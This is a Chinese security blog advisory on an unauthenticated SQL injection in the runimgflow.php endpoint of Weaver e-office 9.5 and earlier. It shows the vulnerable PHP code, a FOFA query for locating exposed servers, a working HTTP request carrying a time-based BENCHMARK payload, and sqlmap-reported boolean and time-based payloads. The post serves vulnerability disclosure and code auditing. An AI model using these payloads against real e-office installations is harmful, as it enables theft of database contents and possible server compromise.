---
title: "泛微e-office runimgflow.php sql注入漏洞"
source: https://mrxn.net/jswz/eoffice-general-workflow-runimgflow-sqli.html
asset_dir: assets/泛微e-office-runimgflow.php-sql注入漏洞
---

# 泛微e-office runimgflow.php sql注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/3/15 08:20
- 743浏览
- [0评论](#comment)
- 14分钟阅读

深入探索

SQL

数据库

应用程序

---

# 漏洞简介

[泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)E-Office是一款标准化的协同 OA 办公软件，泛微协同办公产品系列成员之一,实行通用化产品设计，充分贴合企业管理需求，本着简洁易用、高效智能的原则，为企业快速打造移动化、无纸化、数字化的办公平台。泛微e-office runimgflow.php 接口处存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

# 影响版本

e-office <=9.5

# fofa语句

> `app="泛微-EOffice"`

# 漏洞分析

general/workflow/runimgflow.php 业务逻辑如下

```
<?php

include_once( "inc/conn.php" );
include_once( "inc/img_flow.inc.php" );
include_once( "inc/img_patten.inc.php" );
$sql = "  \r\n     SELECT ID,FLOW_ID,PRCS_ID,PRCS_NAME,PRCS_USER,PRCS_ITEM,PRCS_DEPT,PRCS_PRIV,PRCS_TO \r\n\t       FROM flow_process \r\n\t\t       WHERE FLOW_ID=".$_REQUEST['FLOW_ID']." \r\n\t\t\t      ORDER BY PRCS_ID ASC\r\n\t\t\t\t  ";
$res = exequery( $connection, $sql );
```

深入探索

网络安全课程

代码安全审计

安全研究工具

`FLOW_ID` 被直接拼接进SQL语句后执行，无任何过滤校验，造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
GET /general/workflow/runimgflow.php HTTP/1.1
Host: eoffice.mrxn.net:8082
Cookie: FLOW_ID=1 AND 7348=BENCHMARK(5000000,MD5(0x51747266))
```

[![泛微e-office runimgflow.php sql注入漏洞](images/img-001-18e61f7e4cb0.webp)](https://image.mrxn.net/47056fd8ef7a4aaeb3554a4957fc75e7.webp)

成功在延时 5 秒

[sqlmap](https://mrxn.net/tag/sqlmap) 结果如下

```
sqlmap identified the following injection point(s) with a total of 378 HTTP(s) requests:
---
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: FLOW_ID=1 AND 2326=2326

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: FLOW_ID=1 AND 7348=BENCHMARK(5000000,MD5(0x51747266))
---
```

imgflow.php、flowimg.php 存在同样的SQL注入漏洞

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语句](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALN0lEQVR4Aeyc23LjNhBEdfL//5zsuOtQxBAQZXtj84GuIM2+zBDGkJGdTeWfx+Px71fWv+2r92j2Rs0pyDu+65vbo732Wl2ri6W9Wl/NWfcVrIH8qbv/usoJbAP586Q83lmrjVurDzwA6cc1HLl1ogXAR438zK8cjDUQDsHK1LIXRIdgebUgfJWD+BCsmtmy/gz3tdtA9uJ9/XsncBgIZOow4rtb9Gl4N99z36m3VrS3XFQX1SHfc+fmRH35GUL6woizusNAZqFb+7kT+GsDgUy/bx2ir54qiG8dhJsXIbo5dfkMVxkYe0H4Kj/rvde+Wrfv4fVfG4gNb/zeCXx7IDA+XRDetwXRz54mfUjePupyiA/n2Gt6Lzmkl/kztO4s9xn/2wP5zM3u7PkJHAbi1DuuWpnT/+D/1i//UeRi1Off1SFPJwS7/qzIlf4Mk/jzryD+7KN8uQjjPdQ7Vu1sQep7fsVnPUqb5Q8DmYVu7edOYBsIZOrwGvvWIHl1CK8noBaEn/mVrWXuXYT0B5YlwMdv/dW/Vg/C6EO4ORi5ughzH6LDa7RP4TaQIvf6/RP4p56Yr6yzrUOeCnubl8Pow8jNixBfLtqvUE2E1JRXC0ZuToT4nVdtLXURki+vlnpdf3Xdb4ineBE8DAQydQj2fUJ0COpDuE9G1zs3B2MdhEPQuo4QH47Ys3LvKX8XYbzHqg7mOYi+qtvrh4Hszfv650/gH8j0IOgWfJpgrptbofViz0H6rvyel5sX1WdoBnIvMzBydfMrXOXUO8L8PjDXq/5+Q+oULrS2gfhU9L11HTJd9Y69HpJXNy8XYcyp73C4hOTtt8chuCMw1sDIjUL0Fe86JO8e9EV1SE59httAZuat/fwJbL+HeOvVNCHTPfMhud5PDqOvbl9xpUPqe878HiFZtVUNJAfBVc4+kJy8Y6+HeR6iwxPvN6Sf5i/zw09ZkGn1KbtPeO33OkgegvbpOXVITh/C9Ve6/lfQnqI9YLy3es+pw+t8r5Pv8X5DPM2L4PYZ4pTcF2TaENQXIbp5EaJDUL0jxIcR7X+WNwdjPbD992X2MCtfIaRX960XITl5x17fuXlIH3ji/Yb00/plfvgM6ftxmuqQaarDyNXP0H4rhPTV7/3UZwiptQbCZ9nSIL750mYLkpt5pUF8CPZ+EB2CVVPLXOH9htSJXGhtnyF9TzWtWjCfpvnK1JK/i1WzX9bBeD/1jnDM2a9nO4fUfuT//Lm7PkSXd18uQvIQXNXBa9+6wvsNqVO40No+Q5y6e4NMdaVD/J6HUX/X7/exTh3SF4L6e4R41uy9uobRh/Dy3lmQPAS9j2gPiA9B9XfwfkPeOaUfzGyfITCfJoz66mnout8DjPXqK1z1Ma8vqu8R3rtn7yGH1ENw37uue6602TKnt+KQ+wCP+w15XOtrG0if3mqbkGnq97rOVzkY+5gT7QNjDkZuboYwz8Jc7/e2p/oKIf16HqJbB6955baBFLnX75/ANhDI9PqU5TD3IbrfCoRD8Kzeuo4w1ttH7PnikJq6rmVWhNGvzGxBcjDiLLvXIHnvp9e5+gy3gczMW/v5E9gG4hQhU15tBUa/18l7fdflMPaDcP3eB+KrQzigdEBg+t/2QnQI9kL30BGS77r88Xh8tOr8Qzz52zaQk9xt/9AJbL+pr+4HeRr0+9Rh9GHOYa7bd4Uw1vX77+u6B2PtPru/7nWdw9in+/aC5CCoLvY6+R7vN8TTuggeflN3Wqv9wevpW79CGOvNQXR5vz/EhxH3ORg9e4lmO1cXIX3kZwjzPESHEV/1u9+QV6fzC972GdKfmhVXF9/dM+QpsU6E6PaBkaub71x9j2YgvWCO5kRITt4R4kOw+/s97K97DlIPR7zfkH5av8wPnyFn+4FMtedgrvecHF7nYfRh5L0PoPRpBD5+T+mFMOo+9T3XOYx1+r2+88rdb0idwoXWPZALDaO2sn2oF6kFz9eteF+z12yfgXm9dRBfLu577K/1xb1X1+qFxWervFrdK22/9Pfa/lpfhHwvctEauQjJ68PIS7/fEE/rIngYSE2pFmR67hPCYUT9qqklfxch/Xq+etVShzEH4XBEazpWv1pdh/Qor5Y+RF9xdRGShxH1RYjfOXD/Ee7jYl+HNwTG6dUTU8t913Ut+RlC+kGwamvByEur1fvBmOv+K179akF69CxEr0yt7ndemdla5dSt6Vx9j4eBWHTj75zA9ouhU+rbgPEpgvCe6xyS633htW4fSE7+Gez3tBbGnuYgOoyob/27COljHsLtB+HdB+7PkMfFvg6/hzjFvk/IVPU7wtzvfaxTh9TJ9TvCPGfdO2jPnl3pMN6z18mtF9VFdTjvd3+GeGoXwe0zpO/HqarLYZwyhOubh+hyEUbdOhHiw4jWXwEhe+t7gbnec3I45u83xNO5CG4DgXFaEO6T637PuDkR0kfeEV773q+jfbpeXA/Su7RaMOcQ3brK7pc6jDkIh6A15uUQv+udV34biOaNv3sCh5+y3E5Nq5YcMmUIdl0uVm0tuVharRVX7wjz+0J0OGLvIYdk5bWfWvIVVma2zEP6mlEXVzqkDrh/D3lc7Gv7KcvpwXNawLZdfVFDDnz8MSgE9UVzchGSh6A5EaL3vP47COnRs/YU9eWQOhhRf4Uw5ntf69T3eH+GeDoXwcNnyH5adQ2ZtvuFOa9srbPcyq/aWjD2N19eLbkIycMT9cSqqwXPDDz/FxwQ3TyMvGr366s5SF8I2meP9xuyP40LXG+fIZCpQdC9+WR0DmNOX7Su48qHsR+EW9/r5OIMIT0g2HvBqMPI7QnRV/ysr3U9pw7pD9w/ZT0u9nX6jyx4Tg+e16tpq8MzCxy+beDjpzIN6zrCmIOR7/P2EvXkK4Sx5yq30iH1EDzLrfzSTwdSoXv93Aksf8qCTNunrONqizCvg+jW2U8Oo6/e0TpIHp7YPWvPdH3ROlEdci91UV9Uh3n+lX+/IZ7ORXD7KavvZzVtmE8dovc6+6707kP6QFBfhOizfhCvZ+UrhHmd94DRt4++XOy6vGPPl3+/IZ7KRfAwEMjTAEH3WdPbL/WOkDoI6kM4BNVFiL6/R13rd4Tk93rl90sPktVTfxe/Wmd/yP3POHD/HvK42Nfhpyz3t3oqINOGoLkV2k80J4exj/pXENILgqse7gFe5x6PsYN1oi6kD4yo37HX7/3DP7L25n398yew/ZTl1MTVVvRFeO+pOOsH6bPKweh7/xnao3vqK4TcwzpzEL1zGHXrOq7qzOkX3m9IncKF1vYZApk2vIf9e5hNu2eKw9i/tP2C+Hutrlf9IXmgYtMFfPx7Mwj20Fnv7svF3g/m9zFnHRxz9xviKV0Et4E4tTPs+zbfdTmMT4F5EeLLRRh1+3U0X9g9SA/1ytSSrxDGOgiH4KpOve5RS/4Z3AbymaI7+/+dwGEgkKcARvzuFuqJqWUfSP/SaqmLpdWSQ/KdQ3R4opmq3y91SFZPXS6udEi9vgjRYUT9d/AwkHeK7sz/dwLfHgi89zTAPAfR+7cI0SHYfZ/iPZpRg9e1EB9GtI8Io29/fbnY9c5XvPRvD6Sa3OvvncBfG4hPB+RpWm3RXEdIHQStN9c5JAdPNCP2WkhWXzQnwphTF61boTkY+5zlq+6vDWR1s1v/3AkcBlJTmq1VW7P6chifDnVzHfU7QvqoQ7j16oVqkAyMWJlaEH2VV69sLXidh/gQ7PXVo5Y6jDn1wsNASrzX753ANhDI1OA1vrvVeiL2C173hdFf3cee+vCs655ctOaMm4P0XnF1+4nqkHoY8ZW/DcTQjb97AvdAfvf8D3f/DwAA///5rKlCAAAABklEQVQDACdRjMt9eXQRAAAAAElFTkSuQmCC)

手机扫码阅读
